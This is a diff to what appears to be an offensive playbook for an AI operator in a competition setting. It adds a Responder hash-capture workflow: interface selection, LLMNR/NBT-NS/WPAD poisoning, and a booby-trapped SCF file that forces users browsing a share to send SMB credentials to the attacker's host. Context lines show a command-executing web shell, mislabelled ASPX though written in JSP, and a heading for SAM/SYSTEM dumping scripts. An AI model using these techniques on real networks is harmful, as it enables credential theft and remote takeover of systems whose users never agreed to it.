@@ -197,6 +197,37 @@ Minimal ASPX shell:
 <% if(request.getParameter("c")!=null){ Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash","-c",request.getParameter("c")}); DataInputStream dis = new DataInputStream(p.getInputStream()); String dirone = ""; String drone; while((drone = dis.readLine()) != null){ dirone += drone; } out.println("<pre>" + dirone + "</pre>"); } %>
 ```
 
+## Responder and SCF-Based Hash Capture
+
+When the operator requests a Responder-based hash capture workflow (SCF file drops, LLMNR/NBT-NS poisoning, or WPAD attacks), always include an interface verification step before starting Responder.
+
+**Step 1 — Verify correct network interface:**
+```bash
+# Show routing table to identify which interface reaches the target subnet
+ip route show
+# Identify the interface for the target network (e.g., eth0, tun0, tap0)
+ip route get <target-IP>
+```
+
+**Step 2 — Start Responder on the correct interface:**
+```bash
+# Use the interface identified in Step 1 — do NOT default to eth0
+sudo responder -I <correct-interface> -dwPv
+```
+
+If the jumpbox uses a VPN tunnel (tun0/tap0) to reach competition infrastructure, Responder MUST run on the tunnel interface, not the physical interface. Running on the wrong interface captures zero hashes because Responder never sees the target network's broadcast traffic.
+
+**Step 3 — Deploy SCF file to writable share (if applicable):**
+```
+# SCF file content — forces SMB auth to Responder when any user browses the share
+[Shell]
+Command=2
+IconFile=\\<jumpbox-IP>\share\icon.ico
+[Taskbar]
+Command=ToggleDesktop
+```
+Save as `@inventory.scf` (the @ prefix sorts it to the top of directory listings, ensuring it is processed when the folder is opened).
+
 ## Credential Harvesting Scripts
 
 ### Windows SAM and SYSTEM Dump
